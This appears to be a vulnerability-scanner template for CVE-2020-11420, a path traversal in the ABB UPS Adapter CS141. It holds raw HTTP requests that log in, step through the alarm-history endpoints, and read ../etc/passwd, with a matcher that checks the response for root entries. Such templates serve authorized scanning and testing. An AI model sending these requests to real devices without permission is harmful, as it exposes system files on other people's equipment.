id: CVE-2020-11420

info:
  name: ABB UPS Adapter CS141 â€“ Path traversal
  author: socketz
  severity: medium
  description: |
    A vulnerability exists in the UPS Adapter CS141 included in the versions 1.66 to 1.88. An attacker
    with Admin or Engineer login credentials could exploit the vulnerability by manipulating variables that
    reference files and by doing this achieve access to files and directories outside the web root folder. An
    attacker may access arbitrary files and directories stored in the file system, but integrity of the files are
    not jeopardized as attacker have read access rights only. This attack is commonly known as Path
    Traversal or Directory Traversal.
    This Path Traversal vulnerability could be exploited only when Alarm Logs have been processed,
    and then you can exploit it, before that, you should wait.
  reference: https://library.e.abb.com/public/ee46f3ff5823400f991ebd9bd43a297e/2CMT2020-005913%20Security%20Advisory%20CS141.pdf
  tags: cve,cve2020,iot,lfi,authenticated

requests:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/plain, */*
        Content-Type: application/json

        {"userName":"{{UPS_USER}}","password":"{{UPS_PASS}}"}

      - |
        GET /api/system/info HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/api/login

      - |
        GET /api/devices/ups/upsEvtHistCaps HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/api/login

      - |
        GET /lib/history.html?inputType=0&upsEvtHistCapa=1&upsProtocol= HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/api/devices/ups/upsEvtHistCaps

      - |
        GET /api/devices/ups/control?code=getAlarmData&alarmFileName=alrmhist.csv HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/api/devices/ups/upsEvtHistCaps

      - |
        GET /api/devices/ups/control?code=getAlarmData&alarmFileName=../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/lib/history.html?inputType=0&upsEvtHistCapa=1&upsProtocol=

    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code==200 && contains(body, '\\\"eventState\\\" : 0') && waitfor(60) && status_code==200 && contains(body, 'root:.*:0:0:')"